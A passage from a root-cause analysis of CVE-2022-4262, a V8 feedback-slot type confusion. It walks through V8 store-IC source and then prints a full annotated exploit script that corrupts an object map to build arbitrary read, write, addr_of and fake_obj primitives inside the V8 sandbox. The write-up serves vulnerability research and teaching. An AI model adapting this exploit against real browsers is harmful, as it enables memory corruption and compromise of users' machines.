Then it checks whether the second element of feedback vector is a map at line 1419, as this element is a map, the control flow goes to `store_transition`.

Finally, the control flow enters into `AccessorAssembler::HandleStoreICTransitionMapHandlerCase`.

##### AccessorAssembler::HandleStoreICTransitionMapHandlerCase

`AccessorAssembler::HandleStoreICTransitionMapHandlerCase` is located at `src/ic/accessor-assembler.cc:1443`.

```cpp
void AccessorAssembler::HandleStoreICTransitionMapHandlerCase(  // Line 1443
    const StoreICParameters* p, TNode<Map> transition_map, Label* miss,
    StoreTransitionMapFlags flags) {
  DCHECK_EQ(0, flags & ~kStoreTransitionMapFlagsMask);
  if (flags & kCheckPrototypeValidity) {
    TNode<Object> maybe_validity_cell =
        LoadObjectField(transition_map, Map::kPrototypeValidityCellOffset);
    CheckPrototypeValidityCell(maybe_validity_cell, miss);  // Line 1450
  }

  TNode<Uint32T> bitfield3 = LoadMapBitField3(transition_map);
  CSA_DCHECK(this, IsClearWord32<Map::Bits3::IsDictionaryMapBit>(bitfield3));
  GotoIf(IsSetWord32<Map::Bits3::IsDeprecatedBit>(bitfield3), miss);

  // Load last descriptor details.
  TNode<UintPtrT> nof =
      DecodeWordFromWord32<Map::Bits3::NumberOfOwnDescriptorsBits>(bitfield3);
  CSA_DCHECK(this, WordNotEqual(nof, IntPtrConstant(0)));
  TNode<DescriptorArray> descriptors = LoadMapDescriptors(transition_map);

  TNode<IntPtrT> factor = IntPtrConstant(DescriptorArray::kEntrySize);
  TNode<IntPtrT> last_key_index = UncheckedCast<IntPtrT>(IntPtrAdd(
      IntPtrConstant(DescriptorArray::ToKeyIndex(-1)), IntPtrMul(nof, factor)));
  if (flags & kValidateTransitionHandler) {
    TNode<Name> key = LoadKeyByKeyIndex(descriptors, last_key_index);
    GotoIf(TaggedNotEqual(key, p->name()), miss);
  } else {
    CSA_DCHECK(this, TaggedEqual(LoadKeyByKeyIndex(descriptors, last_key_index),
                                 p->name()));
  }
  TNode<Uint32T> details = LoadDetailsByKeyIndex(descriptors, last_key_index);
  if (flags & kValidateTransitionHandler) {
    // Follow transitions only in the following cases:
    // 1) name is a non-private symbol and attributes equal to NONE,
    // 2) name is a private symbol and attributes equal to DONT_ENUM.
    Label attributes_ok(this);
    const int kKindAndAttributesDontDeleteReadOnlyMask =
        PropertyDetails::KindField::kMask |
        PropertyDetails::kAttributesDontDeleteMask |
        PropertyDetails::kAttributesReadOnlyMask;
    static_assert(static_cast<int>(PropertyKind::kData) == 0);
    // Both DontDelete and ReadOnly attributes must not be set and it has to be
    // a kData property.
    GotoIf(IsSetWord32(details, kKindAndAttributesDontDeleteReadOnlyMask),
           miss);

    // DontEnum attribute is allowed only for private symbols and vice versa.
    Branch(Word32Equal(
               IsSetWord32(details, PropertyDetails::kAttributesDontEnumMask),
               IsPrivateSymbol(CAST(p->name()))),
           &attributes_ok, miss);

    BIND(&attributes_ok);
  }

  OverwriteExistingFastDataProperty(CAST(p->receiver()), transition_map,  // Line 1498
                                    descriptors, last_key_index, details,
                                    p->value(), miss, true);
}


void AccessorAssembler::CheckPrototypeValidityCell( // Line 1782
    TNode<Object> maybe_validity_cell, Label* miss) {
  Label done(this);
  GotoIf(
      TaggedEqual(maybe_validity_cell, SmiConstant(Map::kPrototypeChainValid)),
      &done);
  CSA_DCHECK(this, TaggedIsNotSmi(maybe_validity_cell));

  TNode<Object> cell_value =
      LoadObjectField(CAST(maybe_validity_cell), Cell::kValueOffset);
  Branch(TaggedEqual(cell_value, SmiConstant(Map::kPrototypeChainValid)), &done,  // Line 1792
         miss);

  BIND(&done);
}
```

When control flow enters into `AccessorAssembler::HandleStoreICTransitionMapHandlerCase`, it first calls `AccessorAssembler::CheckPrototypeValidityCell` at line 1450.

At line 1792, it checks whether the content of prototype_validity cell is 0. As this condition satisfies, the control flow moves on to encode the information of the last property in the descriptor array as `last_key_index` and `details`. They decide the position where data will be stored in.

Finally, the control flow reaches line 1498 to call `AccessorAssembler::OverwriteExistingFastDataProperty` with those informations.

##### AccessorAssembler::OverwriteExistingFastDataProperty

`AccessorAssembler::OverwriteExistingFastDataProperty` is located at `src/ic/accessor-assembler.cc:1565`.

```cpp
void AccessorAssembler::OverwriteExistingFastDataProperty(
    TNode<HeapObject> object, TNode<Map> object_map,
    TNode<DescriptorArray> descriptors, TNode<IntPtrT> descriptor_name_index,
    TNode<Uint32T> details, TNode<Object> value, Label* slow,
    bool do_transitioning_store) {
  Label done(this), if_field(this), if_descriptor(this);

  CSA_DCHECK(this,
             Word32Equal(DecodeWord32<PropertyDetails::KindField>(details),
                         Int32Constant(static_cast<int>(PropertyKind::kData))));

  Branch(Word32Equal( // Line 1576
             DecodeWord32<PropertyDetails::LocationField>(details),
             Int32Constant(static_cast<int32_t>(PropertyLocation::kField))),
         &if_field, &if_descriptor);

  BIND(&if_field);  // Line 1581
  {
    TNode<Uint32T> representation =
        DecodeWord32<PropertyDetails::RepresentationField>(details);

    CheckFieldType(descriptors, descriptor_name_index, representation, value,
                   slow);

    TNode<UintPtrT> field_index =
        DecodeWordFromWord32<PropertyDetails::FieldIndexField>(details);
    field_index = Unsigned(
        IntPtrAdd(field_index,
                  Unsigned(LoadMapInobjectPropertiesStartInWords(object_map))));
    TNode<IntPtrT> instance_size_in_words =
        LoadMapInstanceSizeInWords(object_map);

    Label inobject(this), backing_store(this);
    Branch(UintPtrLessThan(field_index, instance_size_in_words), &inobject, // Line 1598
           &backing_store);

    BIND(&inobject);
    {
      TNode<IntPtrT> field_offset = Signed(TimesTaggedSize(field_index));
      Label tagged_rep(this), double_rep(this);
      Branch(
          Word32Equal(representation, Int32Constant(Representation::kDouble)),
          &double_rep, &tagged_rep);
      BIND(&double_rep);
      {
        TNode<Float64T> double_value = ChangeNumberToFloat64(CAST(value));
        if (do_transitioning_store) {
          TNode<HeapNumber> heap_number =
              AllocateHeapNumberWithValue(double_value);
          StoreMap(object, object_map);
          StoreObjectField(object, field_offset, heap_number);
        } else {
          TNode<HeapNumber> heap_number =
              CAST(LoadObjectField(object, field_offset));
          Label store_value(this);
          GotoIfNot(IsPropertyDetailsConst(details), &store_value);
          TNode<Float64T> current_value = LoadHeapNumberValue(heap_number);
          BranchIfSameNumberValue(current_value, double_value, &store_value,
                                  slow);
          BIND(&store_value);
          StoreHeapNumberValue(heap_number, double_value);
        }
        Goto(&done);
      }

      BIND(&tagged_rep);
      {
        if (do_transitioning_store) {
          StoreMap(object, object_map);
        } else {
          Label if_mutable(this);
          GotoIfNot(IsPropertyDetailsConst(details), &if_mutable);
          TNode<Object> current_value = LoadObjectField(object, field_offset);
          BranchIfSameValue(current_value, value, &done, slow,
                            SameValueMode::kNumbersOnly);
          BIND(&if_mutable);
        }
        StoreObjectField(object, field_offset, value);
        Goto(&done);
      }
    }

    BIND(&backing_store); // Line 1647
    {
      TNode<IntPtrT> backing_store_index =
          Signed(IntPtrSub(field_index, instance_size_in_words));

      if (do_transitioning_store) {
        // Allocate mutable heap number before extending properties backing
        // store to ensure that heap verifier will not see the heap in
        // inconsistent state.
        TVARIABLE(Object, var_value, value);
        {
          Label cont(this);
          GotoIf(Word32NotEqual(representation,
                                Int32Constant(Representation::kDouble)),
                 &cont);
          {
            TNode<Float64T> double_value = ChangeNumberToFloat64(CAST(value));
            TNode<HeapNumber> heap_number =
                AllocateHeapNumberWithValue(double_value);
            var_value = heap_number;
            Goto(&cont);
          }
          BIND(&cont);
        }

        TNode<PropertyArray> properties =
            ExtendPropertiesBackingStore(object, backing_store_index);
        StorePropertyArrayElement(properties, backing_store_index,
                                  var_value.value());
        StoreMap(object, object_map); // Line 1676
        Goto(&done);

      } else {
        Label tagged_rep(this), double_rep(this);
        TNode<PropertyArray> properties =
            CAST(LoadFastProperties(CAST(object)));
        Branch(
            Word32Equal(representation, Int32Constant(Representation::kDouble)),
            &double_rep, &tagged_rep);
        BIND(&double_rep);
        {
          TNode<HeapNumber> heap_number =
              CAST(LoadPropertyArrayElement(properties, backing_store_index));
          TNode<Float64T> double_value = ChangeNumberToFloat64(CAST(value));

          Label if_mutable(this);
          GotoIfNot(IsPropertyDetailsConst(details), &if_mutable);
          TNode<Float64T> current_value = LoadHeapNumberValue(heap_number);
          BranchIfSameNumberValue(current_value, double_value, &done, slow);

          BIND(&if_mutable);
          StoreHeapNumberValue(heap_number, double_value);
          Goto(&done);
        }
        BIND(&tagged_rep);
        {
          Label if_mutable(this);
          GotoIfNot(IsPropertyDetailsConst(details), &if_mutable);
          TNode<Object> current_value =
              LoadPropertyArrayElement(properties, backing_store_index);
          BranchIfSameValue(current_value, value, &done, slow,
                            SameValueMode::kNumbersOnly);

          BIND(&if_mutable);
          StorePropertyArrayElement(properties, backing_store_index, value);
          Goto(&done);
        }
      }
    }
  }

  BIND(&if_descriptor);
  {
    // Check that constant matches value.
    TNode<Object> constant =
        LoadValueByKeyIndex(descriptors, descriptor_name_index);
    GotoIf(TaggedNotEqual(value, constant), slow);

    if (do_transitioning_store) {
      StoreMap(object, object_map);
    }
    Goto(&done);
  }
  BIND(&done);
}
```

When control flow enters into `AccessorAssembler::OverwriteExistingFastDataProperty`, it first checks whether the `details` is a field at line 1576. As `details` is the last property indeed a field, the control flow branches to label `if_field` at line 1581.

Then the control flow checks whether the last property is in object cell or in backing store at line 1598. As the last property is in backing store, it reaches label `backing_store` at line 1647.

Finally, control flow calls into `CodeStubAssembler::StoreMap` to store the second element of feedback slot as map of object `o` at line 1676.

# Exploit Primitive in V8 Sandbox

### Explained Exploit Source

This is a modified version of `exploit.js` from @mistymntncop's exploit repo [mistymntncop/CVE-2022-4262](#RefList-2) with the explanatory comments. The most comments are from @mistymntncop and others are from me. Let's thank @mistymntncop again for his crafted artifact!

```javascript
var conv_ab = new ArrayBuffer(8);
var conv_f64 = new Float64Array(conv_ab);
var conv_b64 = new BigInt64Array(conv_ab);

function dtoi(f) {
    conv_f64[0] = f;
    return conv_b64[0];
}

function itod(i) {
    conv_b64[0] = i;
    return conv_f64[0];
}

function ptr(addr) {
    return addr | 1n;
}
function unptr(addr) {
    return addr & ~3n;
}

function smi(i) {
    return i << 1n;
}
function unsmi(i) {
    return i >> 1n;
}

const FIXED_ARRAY_HEADER_SIZE = 8n;
var large_arr = new Array(0x10000);
large_arr.fill(itod(0xDEADBEE0n)); // change array type to HOLEY_DOUBLE_ELEMENTS
var packed_map = null;
var packed_double_map = null;
var packed_double_props = null;
var fake_arr_elements_addr = null;
var fake_arr = null;

function fake_obj(addr) {
    large_arr[0] = itod(packed_map | (packed_double_props << 32n)); // object_map, properties
    large_arr[1] = itod(fake_arr_elements_addr | (smi(1n) << 32n)); // elements, length
    large_arr[3] = itod(ptr(addr));

    let result = fake_arr[0];

    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n)); // elements, length

    return result;
}
function addr_of(obj) {
    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));  // double_map, properties
    large_arr[1] = itod(fake_arr_elements_addr | (smi(1n) << 32n));         // elements, length

    fake_arr[0] = obj;
    let result = dtoi(large_arr[3]) & 0xFFFFFFFFn;

    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));         // elements, length

    return result;
}
function v8_read64(addr) {
    addr -= FIXED_ARRAY_HEADER_SIZE;

    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));  // double_map, properties
    large_arr[1] = itod(ptr(addr) | (smi(1n) << 32n));                      // elements, length

    let result = dtoi(fake_arr[0]);

    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));         // elements, length

    return result;
}
function v8_write64(addr, val) {
    addr -= FIXED_ARRAY_HEADER_SIZE;

    large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));  // double_map, properties
    large_arr[1] = itod(ptr(addr) | (smi(1n) << 32n));                      // elements, length

    fake_arr[0] = itod(val);

    large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));         // elements, length
}

function gc_minor() { // scavenge
    for(let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}
function gc_major() { // mark-compact
    new ArrayBuffer(0x7fe00000);
}
// https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/18865d6af0404f2d2aeb1c99dd73503364ce0967:src/flags/flag-definitions.h;l=1444
function flush_bytecode() {
    // please change to be the "bytecode_old_age" value from ./src/flags/flag-definitions.h
    // you can observe if this is working by passing the "--trace-gc" flag
    const bytecode_old_age = 5;
    for(let i = 0; i < (bytecode_old_age+1); i++) {
        //doesn't seem to matter if the allocation fails
        try {
            gc_major();
        } catch(err) {
            print(err);
        }
    }
}

function make_small() {
    let result = {};
    result.p1 = 1;
    return result;
}
function make_big() {
    /*
        These are all inline properties. If we make a small object have the
    same map as this big object then we will be able to access out of bounds.
    */
    let result = {
        p1: 1, p2: 2, p3: 3, p4: 4, p5: 5, p6: 6, p7: 7, p8: 8, p9: 9, p10: 10,
        p11: 11, p12: 12, p13: 13, p14: 14, p15: 15, p16: 16, p17: 17, p18: 18
    };
    /*
        We need to add an extra property to transition the big object to a new map
    with a cleared validity cell. Also, the extra field is external and captures
    the write so that doesn't interfere with our inline properties.
    */
    result.extra = 1;
    return result;
}
var ballast = null;
var small_obj = make_small();
var big_obj = make_big();
var corrupted_obj = null;
var arr1 = null;
var arr2 = null;
%GlobalPrint("small ==========================\n");
%DebugPrint(small_obj);
%GlobalPrint("big ==========================\n");
%DebugPrint(big_obj);

/*
    We use the `SetNamedProperty` instruction to cause memory corruption. This bytecode
instruction uses the `SetNamedStrict` feedback vector slots.

    In this example, before we trigger GC, the first `SetNamedStrict` is at slot #4. After
GC, it is at slot #8. This slot now points to controlled feedback. Specifically,
- The first `SetNamedStrict` element [8] contains the map (`small_obj`'s map) of object which need to be corrupted.
- The second `SetNamedStrict` element [9] contains the map (`big_obj`'s map) we want to transition the object to.

    We have already analyzed how memory corruption is achieved by analyze the whole code
path in the previous section. So we'll mainly focus on how to organize the script to craft
the feedback elements and slots in feedback vector.

    First 10 iterations of the loop installs the feedback vector and seeds it with feedback.
The 11th iteration triggers the vulnerabiltiy and changes the map of `corrupted_obj`.
*/
for(let i = 0; i < 11; i++) {
    %GlobalPrint(i + " ===============================\n");
    // this prevents bad results from `LoadGlobalNotInsideTypeof` slots from crashing the exploit
    function dummy() { return true; }

    // Use local variables here instead of global variables or it would create extra slots in the feedback vector
    let target = {}; // Placeholder - this is the object whose map we want to change.
    let SetNamedStrict_slot1 = {}; // This gets transitioned to `small_obj`'s map once we add property `p1`
    let LoadProperty_slot0 = big_obj; // This is the object whose map we want `target` to transition to.
    if(i == 10) {
        %GlobalPrint("GC ==========================\n");
        // This causes the arrow function's bytecode to be thrown away
        flush_bytecode();
        // Allocate all the objects after GC so that they are allocated in NewSpace
        corrupted_obj = make_small();
        target = corrupted_obj;
        arr1 = [1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310]; // PACKED_DOUBLE_ELEMENTS, 0x0000222200002222
        arr2 = [large_arr,2,3,4,5,6,7,8]; // PACKED_ELEMENTS
    }

    // This will cause `corrupted_obj`, with `small_obj`'s map, to transition to `big_obj`'s map
    // Unfortunately because of the nature of the vulnerability we can't put this in it's own function :-(
    ((a = class Clazz {
       [(dummy(
            eval(),
            eval, // This reference consumes 2 feedback slots (LoadGlobalNotInsideTypeof) upon reparse
            eval, // This reference consumes 2 feedback slots (LoadGlobalNotInsideTypeof) upon reparse
            target.p1 = 123, // This is the statement later make the evil `SetNamedStrict` slot in element [8] and [9], initially in [4] and [5]
            [], // This Literal (AllocationSite) uses 1 feedback slot instead of 2. This is important, or it won't work! Slot value has to be a valid pointer!
            SetNamedStrict_slot1.p1 = 1, // The map of `small_obj` will be in element [8], which is the second element of current bytecode's `SetNamedStrict` slot
            LoadProperty_slot0.p1 // The map of `big_obj` will be in element [9], which is the first element of current bytecode's `LoadProperty` slot
        )
        ? 0 : (ballast = 1)) // The `StoreGlobalStrict` slot belonging to this bytecode disappears after GC, which is to make sure the slot length of the feedback vector and feedback metadata are equal
       ]
    }) => {})();

    /*
      We couldn't find a feedback slot whose 2 elements can be controlled arbitrarily. So we had to use
    2 different instruction feedback slots. Namely, `SetNamedStrict` and `LoadProperty`. By putting the
    map of the object we want to transition from in the 2nd element of `SetNamedStrict` slot and the map
    we want to transition to in the 1st element of `LoadProperty` slot we can create our "fake slot".
    */
}

/*
Feedback Vector before GC:
 - slot #0 LoadGlobalNotInsideTypeof MONOMORPHIC
   [weak] 0x0ca4001942f1 <PropertyCell name=0x0ca400005fe5 <String[4]: #eval> value=0x0ca40018ae09 <JSFunction eval (sfi = 0xca40015aafd)>> {
     [0]: [weak] 0x0ca4001942f1 <PropertyCell name=0x0ca400005fe5 <String[4]: #eval> value=0x0ca40018ae09 <JSFunction eval (sfi = 0xca40015aafd)>>
     [1]: 0x0ca4000073bd <Symbol: (uninitialized_symbol)>
  }
 - slot #2 Call MONOMORPHIC {
     [2]: [weak] 0x0ca40018ae09 <JSFunction eval (sfi = 0xca40015aafd)>
     [3]: 4
  }
 - slot #4 SetNamedStrict MONOMORPHIC
   [weak] 0x0ca40018474d <Map[28](HOLEY_ELEMENTS)>: StoreHandler(<unexpected>)(0x0ca40019bf65 <Map[28](HOLEY_ELEMENTS)>) {
     [4]: [weak] 0x0ca40018474d <Map[28](HOLEY_ELEMENTS)>
     [5]: [weak] 0x0ca40019bf65 <Map[28](HOLEY_ELEMENTS)>
  }
 - slot #6 Literal  {
     [6]: 0x0ca40019cc1d <AllocationSite>
  }
 - slot #7 SetNamedStrict MONOMORPHIC
   [weak] 0x0ca40018474d <Map[28](HOLEY_ELEMENTS)>: StoreHandler(<unexpected>)(0x0ca40019bf65 <Map[28](HOLEY_ELEMENTS)>) {
     [7]: [weak] 0x0ca40018474d <Map[28](HOLEY_ELEMENTS)>
     [8]: [weak] 0x0ca40019bf65 <Map[28](HOLEY_ELEMENTS)> [!] Content consistent; Slot type changed
  }
 - slot #9 LoadProperty MONOMORPHIC
   [weak] 0x0ca40019c4d5 <Map[84](HOLEY_ELEMENTS)>: LoadHandler(Smi)(kind = kField, is in object = 1, is double = 0, field index = 3) {
     [9]: [weak] 0x0ca40019c4d5 <Map[84](HOLEY_ELEMENTS)> [!] Content consistent; Slot type changed
     [10]: 1668
  }
 - slot #11 Call UNINITIALIZED {
     [11]: 0x0ca4000073bd <Symbol: (uninitialized_symbol)>
     [12]: 4
  }
 - slot #13 StoreGlobalStrict UNINITIALIZED {
     [13]: [cleared]
     [14]: 0x0ca4000073bd <Symbol: (uninitialized_symbol)>
  }
 - slot #15 SetNamedStrict UNINITIALIZED {
     [15]: 0x0ca4000073bd <Symbol: (uninitialized_symbol)>
     [16]: 0x0ca4000073bd <Symbol: (uninitialized_symbol)>
  }

Feedback Vector after GC:
 - slot #0 LoadGlobalNotInsideTypeof MONOMORPHIC
   [weak] 0x0ca4001942f1 <PropertyCell name=0x0ca400005fe5 <String[4]: #eval> value=0x0ca40018ae09 <JSFunction eval (sfi = 0xca40015aafd)>> {
     [0]: [weak] 0x0ca4001942f1 <PropertyCell name=0x0ca400005fe5 <String[4]: #eval> value=0x0ca40018ae09 <JSFunction eval (sfi = 0xca40015aafd)>>
     [1]: 0x0ca4000073bd <Symbol: (uninitialized_symbol)>
  }
 - slot #2 Call MONOMORPHIC {
     [2]: [weak] 0x0ca40018ae09 <JSFunction eval (sfi = 0xca40015aafd)>
     [3]: 8
  }
 - slot #4 LoadGlobalNotInsideTypeof MONOMORPHIC
   LoadHandler(<unexpected>)(0x0ca40018474d <Map[28](HOLEY_ELEMENTS)>) {
     [4]: [weak] 0x0ca40018474d <Map[28](HOLEY_ELEMENTS)>
     [5]: [weak] 0x0ca40019bf65 <Map[28](HOLEY_ELEMENTS)>
  }
 - slot #6 LoadGlobalNotInsideTypeof MONOMORPHIC
   LoadHandler(<unexpected>)(0x0ca40019cc1d <AllocationSite>) {
     [6]: 0x0ca40019cc1d <AllocationSite>
     [7]: [weak] 0x0ca40018474d <Map[28](HOLEY_ELEMENTS)>
  }
 - slot #8 SetNamedStrict MONOMORPHIC
   [weak] 0x0ca40019bf65 <Map[28](HOLEY_ELEMENTS)>: StoreHandler(<unexpected>)(0x0ca40019c4d5 <Map[84](HOLEY_ELEMENTS)>) {
     [8]: [weak] 0x0ca40019bf65 <Map[28](HOLEY_ELEMENTS)> [!] Content consistent; Slot type changed
     [9]: [weak] 0x0ca40019c4d5 <Map[84](HOLEY_ELEMENTS)> [!] Content consistent; Slot type changed
  }
 - slot #10 Literal  {
     [10]: 1668
  }
 - slot #11 LoadProperty MONOMORPHIC
   [cleared]: LoadHandler(Smi)(kind = kField, is in object = 0, is double = 0, field index = 0) {
     [11]: [cleared]
     [12]: 4
  }
 - slot #13 Call MONOMORPHIC {
     [13]: [cleared]
     [14]: 0x0ca4000073bd <Symbol: (uninitialized_symbol)>
  }
 - slot #15 SetNamedStrict MONOMORPHIC
   [cleared]: StoreHandler(Smi)(kind = kSlow, keyed access store mode = STANDARD_STORE)
 {
     [15]: [cleared]
     [16]: 10
  }
*/

%GlobalPrint("corrupted_obj ===========================\n");
%DebugPrint(corrupted_obj);

corrupted_obj.p18 = 0x30; // Modify the length of array `arr1`

// Get metadata of `large_arr`
let large_arr_addr = dtoi(arr1[7]) & 0xFFFFFFFFn;
let large_arr_elements_field_addr = large_arr_addr + 8n;

// Get fixed map, properties and elements metadata
let packed_double_map_and_props = dtoi(arr1[4]);
packed_double_map = packed_double_map_and_props & 0xFFFFFFFFn;
packed_double_props = packed_double_map_and_props >> 32n;
let packed_double_elements = dtoi(arr1[5]) & 0xFFFFFFFFn;   // arr1.elements

let packed_map_and_props = dtoi(arr1[11]);
packed_map = packed_map_and_props & 0xFFFFFFFFn;
let packed_props = packed_map_and_props >> 32n;

let fixed_arr_map = dtoi(arr1[6]) & 0xFFFFFFFFn;

// Fake a temporary double array in arr1.elements to read large_arr.elements
arr1[0] = itod(packed_double_map | (packed_double_props << 32n));
arr1[1] = itod((large_arr_elements_field_addr - FIXED_ARRAY_HEADER_SIZE) | (smi(1n) << 32n));

let temp_fake_arr_addr = packed_double_elements + FIXED_ARRAY_HEADER_SIZE;
arr1[7] = itod(temp_fake_arr_addr);
let temp_fake_arr = arr2[0];
let large_arr_elements_addr = dtoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
temp_fake_arr = null;

// Fake a permanent double array in large_arr.elements
let fake_arr_addr = large_arr_elements_addr + FIXED_ARRAY_HEADER_SIZE;
fake_arr_elements_addr = fake_arr_addr + 16n;

large_arr[0] = itod(packed_double_map | (packed_double_props << 32n));
large_arr[1] = itod(fake_arr_elements_addr | (smi(0n) << 32n));
large_arr[2] = itod(fixed_arr_map | (smi(0n) << 32n));

// fake_arr = JSReference(large_arr.elements)
arr1[7] = itod(fake_arr_addr);
fake_arr = arr2[0];

// Clean up
corrupted_obj.p18 = 4;
let small_obj_addr = addr_of(small_obj);
let small_obj_map_and_props = v8_read64(small_obj_addr);
let corrupted_obj_addr = addr_of(corrupted_obj);
v8_write64(corrupted_obj_addr, small_obj_map_and_props); // Restore the corrupted map
corrupted_obj = null;

// Primitives are available now

%GlobalPrint("arr1 ===========================\n");
%DebugPrint(arr1);
%GlobalPrint("arr2 ===========================\n");
%DebugPrint(arr2);
%GlobalPrint("small_obj_addr = " + small_obj_addr.toString(16) + "\n");
%GlobalPrint("small_obj_map_and_props = " + small_obj_map_and_props.toString(16) + "\n");
%GlobalPrint("corrupted_obj_addr = " + corrupted_obj_addr.toString(16) + "\n");

%GlobalPrint("large_arr_addr = " + large_arr_addr.toString(16) + "\n");
%GlobalPrint("fixed_arr_map = " + fixed_arr_map.toString(16) + "\n");
%GlobalPrint("packed_double_elements = " + packed_double_elements.toString(16) + "\n");
%GlobalPrint("large_arr_elements_addr = " + large_arr_elements_addr.toString(16) + "\n");
%GlobalPrint("fake_arr_addr = " + fake_arr_addr.toString(16) + "\n");

```

# Conclusion

In this write up, we have introduced a non-trivial *feedback slot* type confusion vulnerability. We not only present its proof of concept, but also deliver the root cause analysis and exploit of this vulnerability to the readers.

This vulnerability is caused by a parsing inconsistency across two bytecode generation process. The parsing inconsistency is reflected on the difference of bytecode further differentiate type of feedback slots. Then the difference in type of feedback slots can be used to make out of bound access on object. Hence the primitive in sandbox can be created.

# Acknowledgement

I'd like to thanks all people once spent their times on this non-trivial vulnerability:

- Official Chromium [bug report](https://bugs.chromium.org/p/chromium/issues/detail?id=1394403).
- Shoutout to [@mistymntncop](https://twitter.com/mistymntncop) for [finding the artful exploit](https://github.com/mistymntncop/CVE-2022-4262) and discussing with me.
- Shoutout to [@_clem1](https://twitter.com/_clem1) for [finding the ITW exploit](https://chromereleases.googleblog.com/2022/12/stable-channel-update-for-desktop.html).
- Shoutout to [@5aelo](https://twitter.com/5aelo) for his [RCA on the bug](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-4262.html).
- Shoutout to [@alisaesage](https://twitter.com/alisaesage) for her [video on the bug](https://youtu.be/WouAptHlyC4?t=2078).


# Reference
1. <a id="RefList-1" href="https://github.com/bjrjk/CVE-2022-4262/blob/main/RCA/RCA.md">CVE-2022-4262/RCA/RCA.md at main · bjrjk/CVE-2022-4262</a>
2. <a id="RefList-2" href="https://github.com/mistymntncop/CVE-2022-4262">mistymntncop/CVE-2022-4262</a>
3. <a id="RefList-3" href="https://v8.dev/blog/v8-lite#bytecode-flushing">Bytecode flushing - A lighter V8 · V8</a>
4. <a id="RefList-4" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode">Strict mode - JavaScript | MDN</a>
5. <a id="RefList-5" href="https://developer.mozilla.org/en-US/docs/Glossary/Scope">Scope - MDN Web Docs Glossary: Definitions of Web-related terms | MDN</a>
6. <a id="RefList-6" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval">eval() - JavaScript | MDN</a>
7. <a id="RefList-7" href="https://whereswalden.com/2011/01/10/new-es5-strict-mode-support-new-vars-created-by-strict-mode-eval-code-are-local-to-that-code-only/">Where&#039;s Walden? &raquo; New ES5 strict mode support: new vars created by strict mode eval code are local to that code only</a>
8. <a id="RefList-8" href="https://mathiasbynens.be/notes/shapes-ics">JavaScript engine fundamentals: Shapes and Inline Caches · Mathias Bynens</a>
9. <a id="RefList-9" href="https://en.wikipedia.org/wiki/Inline_caching#Monomorphic_inline_caching">Monomorphic inline caching - Inline caching - Wikipedia</a>
10. <a id="RefList-10" href="https://v8.dev/docs/hidden-classes">Maps (Hidden Classes) in V8 · V8</a>
11. <a id="RefList-11" href="https://stackoverflow.com/questions/45474802/could-you-explain-sender-and-receiver-in-oop-and-give-examples">object - Could you explain sender and receiver in OOP and give examples? - Stack Overflow</a>
12. <a id="RefList-12" href="https://github.com/mistymntncop/CVE-2022-4262/blob/main/test.js">CVE-2022-4262/test.js at main · mistymntncop/CVE-2022-4262</a>
13. <a id="RefList-13" href="https://v8.dev/docs/build">Building V8 from source · V8</a>
14. <a id="RefList-14" href="https://benediktmeurer.de/2017/03/01/v8-behind-the-scenes-february-edition">V8: Behind the Scenes (February Edition feat. A tale of TurboFan)</a>
15. <a id="RefList-15" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer#computed_property_names">Object initializer - JavaScript | MDN</a>
16. <a id="RefList-16" href="https://262.ecma-international.org/12.0/#sec-conditional-operator">ECMAScript 2021 Language Specification - Conditional Operator</a>
17. <a id="RefList-17" href="https://llvm.org/docs/StackMaps.html">Stack maps and patch points in LLVM</a>
18. <a id="RefList-18" href="https://v8.dev/blog/csa">Taming architecture complexity in V8 — the CodeStubAssembler · V8</a>
19. <a id="RefList-19" href="https://cabulous.medium.com/javascript-execution-context-part-1-from-compiling-to-execution-84c11c0660f5">JavaScript execution context — from compiling to execution (part 1)</a>
20. <a id="RefList-20" href="https://cabulous.medium.com/javascript-execution-context-part-2-call-stack-and-multiple-execution-contexts-dbe428a94190">JavaScript execution context — call stack and multiple execution contexts (part 2)</a>
21. <a id="RefList-21" href="https://cabulous.medium.com/javascript-execution-context-lexical-environment-and-block-scope-part-3-fc2551c92ce0">JavaScript execution context — lexical environment and block scope (part 3)</a>
22. <a id="RefList-22" href="https://cabulous.medium.com/javascript-execution-context-scope-chain-closure-and-this-part-4-961acd9689c9">JavaScript execution context — scope chain, closure, and this (part 4)</a>
23. <a id="RefList-23" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/class#description">class - JavaScript | MDN</a>
24. <a id="RefList-24" href="https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775">Understanding V8’s Bytecode. | by Franziska Hinkelmann | DailyJS | Medium</a>
25. <a id="RefList-25" href="https://docs.google.com/document/d/11T2CRex9hXxoJwbYqVQ32yIPMh0uouUZLdyrtmMoL44">Ignition Design Doc - Google Docs</a>
26. <a id="RefList-26" href="https://ju256.rip/posts/kitctfctf22-date/#v8s-memory-corruption-api">KITCTFCTF 2022 V8 Heap Sandbox Escape :: Home | ju256</a>
27. <a id="RefList-27" href="https://chromium.googlesource.com/v8/v8/+/4a12cb1022ba335ce087dcfe31b261355524b3bf">4a12cb1022ba335ce087dcfe31b261355524b3bf - v8/v8 - Git at Google</a>
